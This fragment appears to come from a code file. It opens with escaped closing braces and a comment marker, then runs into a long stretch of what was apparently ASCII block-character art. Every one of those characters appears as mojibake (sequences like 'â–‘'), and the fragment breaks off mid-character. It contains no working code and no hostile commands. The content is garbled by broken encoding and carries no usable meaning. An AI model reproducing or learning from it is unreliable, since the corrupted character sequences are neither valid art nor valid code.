&#125;&#125;/*â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–’â–’â–’â–‘â–’â–’â–‘â–‘â–’â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–’â–’â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–’â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–’â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–ˆâ–’â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–“â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–’â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–’â–‘â–’â–ˆâ–ˆâ–“â–“â–’â–‘â–“â–ˆâ–ˆâ–ˆâ–ˆâ–‘â–’â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–’â–’â–’â–ˆâ–“â–ˆâ–’â–‘â–“â–‘â–“â–“â–“â–“â–‘â–’â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–“â–‘â–‘â–‘â–‘â–’â–‘â–“â–ˆâ–’â–‘â–‘â–’â–’â–‘â–‘â–“â–’â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–“â–ˆâ–“â–ˆâ–ˆâ–ˆâ–‘â–‘â–‘â–‘â–‘â–‘â–‘â–“â–ˆâ–ˆâ–ˆâ–ˆâ–“â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–“â–ˆâ–‘â–’â–ˆâ–“â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–’â–ˆâ–’â–‘â–’â–ˆâ–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–ˆâ–“â–“â–’â–’â–ˆâ–ˆâ–ˆâ–“â–“â–“â–ˆâ–ˆâ–ˆâ–‘â–“â–“â–“â–“â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–’â–’â–‘â–“â–ˆâ–ˆâ–“â–ˆâ–ˆâ–ˆâ–“â–“â–“â–’â–‘â–‘â–“â–ˆâ–ˆâ–“â–ˆâ–“â–“â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–“â–ˆâ–’â–’â–“â–“â–ˆâ–ˆâ–ˆâ–“â–“â–’â–‘â–‘â–’â–’â–“â–ˆâ–ˆâ–’â–“â–’â–‘â–“â–ˆâ–’â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–“â–“â–“â–’â–ˆâ–‘â–“â–ˆâ–ˆâ–“â–ˆâ–“â–’â–‘â–‘â–“â–ˆâ–ˆâ–ˆâ–ˆâ–“â–’â–“â–‘â–’â–ˆâ–ˆâ–’â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–“â–“â–“â–’â–’â–’â–“â–“â–‘â–‘â–‘â–“â–“â–‘â–“â–’â–‘â–“â–‘â–‘â–“â–ˆâ–ˆâ–‘â–‘â–ˆâ–“â–“â–“â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–ˆâ–‘â–‘â–‘â–’â–‘â–ˆâ–‘â–‘â–‘â–‘â–’â–’â–’â–’â–‘â–“â–’â–‘â–‘â–‘â–’â–ˆâ–‘â–“â–‘â–“â–“â–’â–’â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–ˆâ–ˆâ–ˆâ–‘â–’â–’â–“â–‘â–‘â–‘â–‘â–‘â–“â–ˆâ–‘â–‘â–“â–“â–‘â–‘â–‘â–‘â–“â–’â–’â–‘â–’â–‘â–’â–“â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–ˆâ–“â–’â–‘â–“â–“â–ˆâ–‘â–‘â–‘â–‘â–‘â–‘â–ˆâ–“â–“â–‘â–“â–‘â–‘â–‘â–’â–‘â–’â–’â–“â–‘â–‘â–“â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–’â–“â–ˆâ–‘â–‘â–“â–ˆâ–“â–‘â–‘â–‘â–‘â–‘â–‘â–ˆâ–‘â–‘â–“â–“â–’â–’â–‘â–’â–ˆâ–“â–‘â–‘â–“â–“â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–’â–“â–‘â–‘â–‘â–‘â–‘â–ˆâ–“â–“â–’â–’â–‘â–’â–ˆâ–“â–“â–’â–’â–“â–“â–’â–‘â–‘â–‘â–“â–’â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–“â–ˆâ–“â–“â–’â–’â–‘â–‘â–“â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–’â–’â–’â–’â–“â–“â–“â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–’â–ˆâ–ˆâ–ˆâ–“â–“â–ˆâ–’â–‘â–’â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–“â–’â–“â–“â–“â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–“â–ˆâ–’â–’â–‘â–‘â–’â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–“â–“â–ˆâ–ˆâ–’â–’â–“â–’â–’â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–“â–“â–’â–‘â–‘â–‘â–“â–“â–ˆâ–ˆâ–ˆâ–‘â–’â–ˆâ–‘â–‘â–ˆâ–ˆâ–“â–’â–’â–’â–“â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–’â–ˆâ–‘â–‘â–‘â–‘â–“â–‘â–‘â–‘â–ˆâ–ˆâ–’â–“â–’â–ˆâ–‘â–‘â–ˆâ–ˆâ–ˆâ–“â–’â–’â–ˆâ–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–“â–‘â–‘â–‘â–‘â–’â–’â–‘â–‘â–‘â–’â–“â–ˆâ–’â–“â–ˆâ–‘â–‘â–ˆâ–’â–’â–ˆâ–’â–“â–ˆâ–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–“â–’â–‘â–‘â–‘â–’â–“â–‘â–‘â–‘â–‘â–ˆâ–“â–“â–“â–’â–’â–ˆâ–’â–‘â–‘â–“â–ˆâ–ˆâ–“â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–“â–‘â–‘â–‘â–‘â–’â–“â–’â–’â–’â–ˆâ–“â–’â–’â–“â–ˆâ–’â–‘â–‘â–‘â–“â–ˆâ–’â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–“â–“â–‘â–‘â–‘â–‘â–‘â–’â–ˆâ–ˆâ–“â–‘â–“â–ˆâ–ˆâ–‘â–‘â–’â–“â–’â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–’â–’â–“â–’â–’â–ˆâ–ˆâ–“â–“â–‘â–ˆâ–ˆâ–ˆâ–’â–’â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–“â–’â–“â–’â–“â–’â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–’â–“â–’â–‘â–‘â–’â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–ˆâ–“â–‘â–“â–ˆâ–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–“â–’â–‘â–‘â–“â–’â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–“â–’â–“â–’â–‘â–“â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–’â–ˆâ–“â–’â–’â–“â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–ˆâ–“â–’â–“â–ˆâ–’â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–“â–“â–“â–‘â–“â–“â–‘â–‘â–‘â–‘â–‘â–‘â–’â–’â–’â–’â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–“â–‘â–“â–“â–‘â–’â–‘â–‘â–‘â–’â–’â–ˆâ–“â–ˆâ–“â–“â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–ˆâ–“â–’â–’â–“â–‘â–‘â–’â–’â–’â–ˆâ–ˆâ–ˆâ–ˆâ–“â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–ˆâ–“â–‘â–’â–“â–‘â–‘â–’â–‘â–’â–“â–“â–ˆâ–ˆâ–’â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–ˆâ–’â–‘â–’â–“â–‘â–‘â–’â–‘â–‘â–‘â–‘â–’â–’â–’â–’â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–’â–ˆâ–“â–‘â–’â–“â–‘â–‘â–“â–’â–’â–‘â–‘â–’â–’â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â